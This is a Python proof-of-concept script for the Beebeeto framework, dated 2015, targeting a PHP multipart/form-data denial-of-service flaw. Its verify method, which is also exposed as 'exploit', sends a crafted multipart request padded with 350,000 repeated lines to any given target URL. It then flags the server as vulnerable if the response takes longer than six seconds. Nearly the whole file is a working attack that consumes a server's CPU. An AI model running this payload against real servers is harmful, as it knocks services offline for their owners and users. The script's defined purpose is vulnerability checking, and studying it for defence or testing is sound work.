#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import datetime
import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0101',
            'name': 'PHP multipart/form-data 远程DOS漏洞 POC',
            'author': 'user1018',
            'create_date': '2015-05-17',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'php',
            'vul_version': ['*'],
            'type': 'Denial of Service',
            'tag': ['PHP DOS漏洞', 'multipart/form-data漏洞', 'php'],
            'desc': '''
                    PHP解析multipart/form-datahttp请求的body part请求头时，重复拷贝字符串导致DOS。
                    远程攻击者通过发送恶意构造的multipart/form-data请求，导致服务器CPU资源被耗尽，从而远程DOS服务器。
                    ''',
            'references': ['http://bsrc.baidu.com/index.php?research/detail/id/22',
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        target = args['options']['target']
        headers = {'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryX3B7rDMPcQlzmJE1',
                   'Accept-Encoding': 'gzip, deflate',
                   'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0'}
        body = "------WebKitFormBoundaryX3B7rDMPcQlzmJE1\nContent-Disposition: form-data; name=\"file\"; filename=bb2.jpg"
        body = body + 'a\n' * 350000
        body = body + 'Content-Type: application/octet-stream\r\n\r\ndatadata\r\n------WebKitFormBoundaryX3B7rDMPcQlzmJE1--'
        if args['options']['verbose']:
            print '[*] Request URL: ' + target
            print '[+] Checking...'
        starttime = datetime.datetime.now()
        request = requests.post(target, body, headers=headers)
        endtime = datetime.datetime.now()
        usetime = (endtime - starttime).seconds
        if args['options']['verbose']:
            print '[*] Response time: %s' %  str(usetime)
        if usetime > 6:
            args['success'] = True
            args['poc_ret']['vul_url'] = target
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())